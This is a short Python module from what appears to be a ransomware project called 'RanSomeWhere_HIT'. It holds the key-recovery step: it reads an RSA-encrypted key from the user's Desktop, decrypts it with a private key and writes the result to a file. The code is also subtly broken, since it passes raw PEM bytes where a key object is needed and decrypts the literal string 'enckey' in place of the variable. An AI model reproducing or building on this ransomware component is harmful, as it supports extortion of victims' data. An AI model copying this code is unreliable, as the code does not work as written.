import binascii
import os
from Crypto.Cipher import PKCS1_OAEP
from base64 import b64decode

"""In this file we decrypt the encrypt password with the RSA private key """
def dy_pass():
    #read the decrypted key
    x=open(os.environ['HOME'] +'/Desktop/RanSomeWhere_HIT/pass','rb')
    hexval=x.read()
    #convert the key from hex to bytes
    enckey=binascii.unhexlify(hexval)
    #import the private key
    server_key=open('private_key_str.pem', 'rb').read()

    decryptorRSA = PKCS1_OAEP.new(server_key)
    # decrypt the key and write the result as hex in a file named key
    deckey=decryptorRSA.decrypt(b'enckey')
    print(deckey)
    f=open(os.environ['HOME'] + '/Desktop/RanSomeWhere_HIT/key','wb')
    f.write(binascii.hexlify(deckey))
    return deckey

  